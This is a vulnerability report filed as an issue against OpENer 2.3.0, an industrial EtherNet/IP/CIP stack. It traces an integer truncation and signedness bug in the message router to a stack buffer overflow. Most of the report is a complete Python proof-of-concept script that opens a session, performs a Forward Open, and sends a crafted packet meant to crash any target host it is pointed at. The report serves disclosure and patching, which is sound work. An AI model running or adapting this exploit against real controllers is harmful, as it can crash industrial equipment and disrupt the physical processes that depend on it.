issue #563

Vulnerability Description

OpENer 2.3.0 (commit 76b95cf) is vulnerable to a severe memory corruption issue caused by integer overflow and signedness truncation. When parsing incoming CIP (Common Industrial Protocol) network packets, the length parameter is inconsistently typed across the call stack. Specifically, an upstream length calculated as an int is passed to a downstream function that expects an EipInt16 (a 16-bit signed integer).

If a maliciously crafted packet with specific length fields is processed, the length parameter can overflow or be truncated into a negative value. This negative length bypasses subsequent bounds checking (due to signed/unsigned comparison issues) and is ultimately used in memory operations, leading to a Stack Buffer Overflow when reading data in DecodePaddedEPath.

Root Cause

The root cause lies in inconsistent integer types and missing bounds checks in source/src/cip/cipmessagerouter.c:

Type Truncation: NotifyMessageRouter(EipUint8 *data, int data_length, ...) receives data_length as a 32-bit int. It then calls CreateMessageRouterRequestStructure(const EipUint8 *data, EipInt16 data_length, ...). If data_length is greater than 32767, it is truncated to a negative EipInt16 value.
Integer Overflow: In endianconv.c, there are unsafe shift operations (e.g., left shift of 128 by 24 places) that cause Undefined Behavior (UBSan trigger) when processing malicious length fields, contributing to the corrupted length value.
Bypassed Bounds Check: Inside CreateMessageRouterRequestStructure(), there is a check: if(number_of_decoded_bytes > data_length). Since number_of_decoded_bytes is a size_t (unsigned), the negative data_length is implicitly cast to a massive unsigned value, bypassing the check.
Underflow to Massive Size: The remaining data size is calculated as request_data_size = data_length - number_of_decoded_bytes. Since request_data_size is size_t, subtracting from a negative value results in an enormous unsigned size. This corrupted size is passed to DecodePaddedEPath, causing a stack buffer overflow when it reads past the bounds of the incoming_message buffer.

PoC

import argparse
import socket
import struct
import sys
import time
from typing import Optional, Tuple


ENCAP_HEADER_LEN = 24

CMD_REGISTER_SESSION = 0x0065
CMD_SEND_RR_DATA = 0x006F
CMD_SEND_UNIT_DATA = 0x0070

ITEM_NULL = 0x0000
ITEM_CONN_ADDR = 0x00A1
ITEM_CONN_DATA = 0x00B1
ITEM_UCMM = 0x00B2


def encap_hdr(command: int, length: int, session: int, context: bytes) -> bytes:
    return (
        struct.pack("<H", command)
        + struct.pack("<H", length)
        + struct.pack("<I", session)
        + b"\x00" * 4
        + context[:8].ljust(8, b"\x00")
        + b"\x00" * 4
    )


def recv_frame(sock: socket.socket) -> Optional[bytes]:
    hdr = sock.recv(ENCAP_HEADER_LEN)
    if len(hdr) < ENCAP_HEADER_LEN:
        return None
    _, data_len, _, _ = struct.unpack("<HHII", hdr[:12])
    body = b""
    while len(body) < data_len:
        chunk = sock.recv(data_len - len(body))
        if not chunk:
            return None
        body += chunk
    return hdr + body


def register_session(sock: socket.socket, context: bytes) -> int:
    req = encap_hdr(CMD_REGISTER_SESSION, 4, 0, context) + struct.pack("<HH", 1, 0)
    sock.sendall(req)
    resp = recv_frame(sock)
    if not resp or len(resp) < ENCAP_HEADER_LEN:
        raise RuntimeError("register response empty")
    cmd, _, session, status = struct.unpack("<HHII", resp[:12])
    if cmd != CMD_REGISTER_SESSION or status != 0 or session == 0:
        raise RuntimeError(
            "register failed: cmd=0x%04x status=0x%08x" % (cmd, status)
        )
    return session


def send_rr(sock: socket.socket, session: int, context: bytes, cip: bytes) -> Optional[bytes]:
    cpf = (
        struct.pack("<H", 2)
        + struct.pack("<H", ITEM_NULL)
        + struct.pack("<H", 0)
        + struct.pack("<H", ITEM_UCMM)
        + struct.pack("<H", len(cip))
        + cip
    )
    cmd = b"\x00" * 4 + b"\x00" * 2 + cpf
    sock.sendall(encap_hdr(CMD_SEND_RR_DATA, len(cmd), session, context) + cmd)
    return recv_frame(sock)


def extract_cip_item(enip_resp: bytes) -> Optional[bytes]:
    payload = enip_resp[ENCAP_HEADER_LEN:]
    if len(payload) < 8:
        return None
    item_count = struct.unpack_from("<H", payload, 6)[0]
    off = 8
    for _ in range(item_count):
        if off + 4 > len(payload):
            return None
        item_type, item_len = struct.unpack_from("<HH", payload, off)
        off += 4
        if off + item_len > len(payload):
            return None
        data = payload[off : off + item_len]
        if item_type in (ITEM_UCMM, ITEM_CONN_DATA):
            return data
        off += item_len
    return None


def forward_open(sock: socket.socket, session: int, context: bytes, idx: int) -> int:
    conn_serial = (0x7000 + (idx & 0x0FFF)) & 0xFFFF
    orig_serial = 0xD34DB33F ^ (idx * 0x01010101)
    req = (
        b"\x54\x02\x20\x06\x24\x01"
        + b"\x07\xf9"
        + struct.pack("<I", 0x800070BA ^ idx)
        + struct.pack("<I", 0x80FE70B9 ^ (idx << 8))
        + struct.pack("<H", conn_serial)
        + struct.pack("<H", 0x004D)
        + struct.pack("<I", orig_serial)
        + b"\x00\x00\x00\x00"
        + struct.pack("<I", 0x007A1200)
        + struct.pack("<H", 0x43F4)
        + struct.pack("<I", 0x007A1200)
        + struct.pack("<H", 0x43F4)
        + b"\xA3\x02\x20\x02\x24\x01"
    )

    resp = send_rr(sock, session, context, req)
    if not resp:
        raise RuntimeError("forward-open no response")
    cip = extract_cip_item(resp)
    if not cip or len(cip) < 12:
        raise RuntimeError("forward-open bad response")
    if cip[0] != 0xD4:
        raise RuntimeError("forward-open bad service 0x%02x" % cip[0])
    if cip[2] != 0:
        ext_vals = []
        cursor = 4
        for _ in range(cip[3]):
            if cursor + 2 > len(cip):
                break
            ext_vals.append("0x%04x" % struct.unpack_from("<H", cip, cursor)[0])
            cursor += 2
        extra = (", ext=[%s]" % ",".join(ext_vals)) if ext_vals else ""
        raise RuntimeError("forward-open status=0x%02x%s" % (cip[2], extra))
    data_off = 4 + cip[3] * 2
    if len(cip) < data_off + 8:
        raise RuntimeError("forward-open data too short")
    return struct.unpack_from("<I", cip, data_off)[0]


def send_trigger_payload(
    sock: socket.socket, session: int, context: bytes, consumed_connection_id: int
) -> Optional[bytes]:
    # ConnectedDataItem.length=1 -> (length - 2) becomes negative.
    connected_data = b"\x00"
    tail_len = 512 - 45  # align with default receive buffer size
    tail = bytearray([0x41, 0x0E, 250])  # seq_hi, service, forged path words
    remain = tail_len - len(tail)
    tail.extend((bytes([0x20, 0x02]) * ((remain + 1) // 2))[:remain])

    cpf = (
        struct.pack("<H", 3)
        + struct.pack("<H", ITEM_CONN_ADDR)
        + struct.pack("<H", 4)
        + struct.pack("<I", consumed_connection_id)
        + struct.pack("<H", ITEM_CONN_DATA)
        + struct.pack("<H", len(connected_data))
        + connected_data
        + bytes(tail)
    )
    cmd = b"\x00" * 4 + b"\x00" * 2 + cpf
    sock.sendall(encap_hdr(CMD_SEND_UNIT_DATA, len(cmd), session, context) + cmd)
    return recv_frame(sock)


def one_attempt(host: str, port: int, timeout: float, idx: int) -> Tuple[bool, str]:
    context = ("SGN%04d" % idx).encode("ascii")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        session = register_session(sock, context)

        msgs = []
        consumed_id = forward_open(sock, session, context, idx)
        resp = send_trigger_payload(sock, session, context, consumed_id)
        if resp is None:
            msgs.append(
                "trigger sent, no response (possible crash), conn_id=0x%08x"
                % consumed_id
            )
        else:
            msgs.append(
                "trigger sent, response len=%d, conn_id=0x%08x"
                % (len(resp), consumed_id)
            )

        return True, " | ".join(msgs)
    except Exception as exc:  # noqa: BLE001
        return False, "%s: %s" % (type(exc).__name__, exc)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def main() -> int:
    parser = argparse.ArgumentParser(
        description="PoC for signed truncation risk and crash validation"
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=44818)
    parser.add_argument("--attempts", type=int, default=5)
    parser.add_argument("--timeout", type=float, default=1.5)
    args = parser.parse_args()

    print(
        "[*] target=%s:%d attempts=%d"
        % (args.host, args.port, args.attempts)
    )
    for i in range(args.attempts):
        ok, info = one_attempt(args.host, args.port, args.timeout, i)
        print("[%03d] %s - %s" % (i + 1, "OK" if ok else "FAIL", info))
        if i + 1 < args.attempts:
            time.sleep(0.15)
    return 0


if __name__ == "__main__":
    sys.exit(main())
